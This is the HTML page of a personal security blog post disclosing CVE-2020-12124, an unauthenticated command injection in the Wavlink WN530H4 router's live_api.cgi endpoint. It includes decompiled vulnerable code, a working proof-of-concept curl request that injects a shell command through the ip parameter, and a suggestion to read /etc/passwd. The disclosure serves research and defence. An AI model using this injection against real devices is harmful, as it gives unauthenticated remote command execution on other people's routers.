<!DOCTYPE html>
<html lang = "en">
    <head>
        <!-- Google analytics -->
        <!-- Global site tag (gtag.js) - Google Analytics -->
        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-35698287-5"></script>
        <script>
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());

            gtag('config', 'UA-35698287-5');
        </script>

        <!-- SEO Stuff -->
        <meta charset = "utf-8">
        <title>Christopher Cerne | CVE-2020-12124</title>
        <meta name = "description" content = "Christopher Cerne is a computer science student, cyber security nerd, and published writer.">
        <link rel = "canonical" href = "https://cerne.xyz" />

        <!-- Temporary fix, later switch to stylesheet -->
        <style>
            p img {
                /* make img responsive */
                width: 100%;
            }
        </style>

        <!-- Bootstrap CDN -->
        <link rel="stylesheet" href = "https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity = "sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin = "anonymous">

        <!-- FontAwesome Kit -->
        <script src = "https://kit.fontawesome.com/616992053c.js" crossorigin = "anonymous"></script>

        <!-- Make the site responsive -->
        <meta name = "viewport" content = "width=device-width, initial-scale=1, shrink-to-fit=no">
    </head>

    <body>
        <div class = "d-flex flex-column flex-md-row align-items-center p-3 px-md-4 mb-0 bg-white border-bottom shadow-sm">
    <h5 class = "my-0 mr-md-auto font-weight-normal">cerne.xyz</h5>
    <nav class="my-2 my-md-0 mr-md-3">
        <a class="p-2 text-dark" href="/pages/trophies.html">Bug Trophies</a>
    </nav>
    <nav class="my-2 my-md-0 mr-md-3">
        <a class="p-2 text-dark" href="/pages/portfolio.html">Portfolio</a>
    </nav>
    <a class="btn btn-outline-primary" href="/">Home</a>
</div>

        <div class = "container">
            <h1 class = "mt-5">CVE-2020-12124</h1>
            <p>This vulnerability is a Command Line Injection in the Wavlink WN530H4 router.</p>

<p>The unauthenticated endpoint, <kbd>/cgi-bin/live_api.cgi</kbd>, contains a command line injection vulnerability where unauthenticated users can execute arbitrary Linux shell commands.</p>

<p>The endpoint <kbd>live_api.cgi</kbd> accepts three parameters in a GET request: page, id, and ip. The ip parameter contains a command line injection vulnerability. The program does not sanitize the ip parameter and uses the value arbitrarily in a call to  the Linux system syscall.</p>

<p>The following code demonstrates the vulnerability, located at address <kbd>0x400ac8</kbd> in the binary. This code is called if the page parameter is set to satellite_list.</p>

<pre>
<code>
sprintf(linux_command,"echo %s, &gt; /tmp/satellite_list &amp;",ip_var);
do_system(linux_command);
</code>
</pre>

<p>There is another endpoint that is activated when the parameter page is set to any other value. This triggers a similar command line injection, located at address <kbd>0x400d24</kbd> in the binary.</p>

<pre>
<code>
sprintf(linux_command,"curl -s -m 5 http://%s/mesh_get_extender.shtml",ip_var);
__stream = popen(linux_command,"r");
if (__stream != (FILE *)0x0) {
    while( true ) {
        pcVar2 = fgets(linux_command,0x80,__stream);
        if (pcVar2 == (char *)0x0) break;
        printf("%s",linux_command);
    }
    pclose(__stream);
    ...
}
</code>
</pre>

<p>Armed with this knowledge, an attacker can send a specially crafted web request like the one shown below.</p>

<pre>
<code>
$ curl /cgi-bin/live_api.cgi?page=abc&amp;id=173&amp;ip=;%20touch%20/tmp/hacked;
</code>
</pre>

<p>This command line injection is not blind, and the attacker can inspect the source code of the resulting page to get the command output. For instance, if the command is set to <kbd>cat /etc/passwd</kbd> we can see how damaging this vulnerability really is.</p>

<p><img src="/assets/img/posts/2020-05-01-CVE-2020-12124-img-1.png" alt="Command Line Injection" /></p>

<p>For more information and vulnerability analysis, please see <a href="/assets/reports/report_wavlink.pdf">my report on the WAVLINK WN530H4</a>.</p>

        </div>

        <!-- Silly hack to add table class to table -->
        <!-- Will remove once adding bootstrap to npm -->
        <script>
        window.onload = function() {
            var tables = document.getElementsByTagName("table"),
                len = tables !== null ? tables.length : 0,
                i = 0;
            for (i; i < len; i++) {
                tables[i].className += " table"; 
            }
}
        </script>

        <footer class = "pt-md-5 border-top p-3 p-md-5 m-md-3">
    <div class = "row">
        <div class = "col-8 col-md">
        <ul class = "list-unstyled text-small">
            <li>
                Christopher Cerne Â© 2020
            </li>
        </ul>
        </div>
        <div class = "col-8 col-md">
            <h5>Contact</h5>
            <ul class = "list-unstyled text-small">
                <li>
                    <a class = "text-primary" href="#"><i class = "fas fa-paper-plane"></i> <span id = "econtact">chris (AT) cerne (DOT) xyz</span></a>
                </li>
            </ul>
        </div>
        <div class = "col-8 col-md">
            <h5>Social</h5>
            <ul class = "list-unstyled text-small">
                <li><a class = "text-primary" href = "https://github.com/cernec1999"  target = "_blank"><i class = "fab fa-github"></i> cernec1999</a></li>
                <li><a class = "text-primary" href = "https://linkedin.com/in/cernec1999"  target = "_blank"><i  class = "fab fa-linkedin"  target = "_blank"></i> cernec1999</a></li>
            </ul>
        </div>

        <div class = "col-8 col-md">
            <h5>Business</h5>
            <ul class = "list-unstyled text-small">
                <li><a class = "text-primary" href = "/res/resume-rev-2.pdf" target = "_blank"><i class = "fas fa-file"></i> Resume</a></li>
            </ul>
        </div>
    </div>
</footer>

<!-- More Bootstrap content -->
<script src = "https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity = "sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin = "anonymous"></script>
<script src = "https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity = "sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin = "anonymous"></script>
<script src = "https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity = "sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin = "anonymous"></script>

<!-- Prevent crawlers from spamming by obfuscating email -->
<script type = "text/javascript">
    var name = "chris";
    var domain = "cerne";
    var tld = "xyz";

    var mail = name + String.fromCharCode(64) + domain + String.fromCharCode(46) + tld;

    var link = "mail" + "to" + ":" + mail;
    var alink = "<a href = \"" + link  + "\">" + mail + "</a>";
    document.getElementById("econtact").innerHTML = alink;
</script>

    </body>
</html>
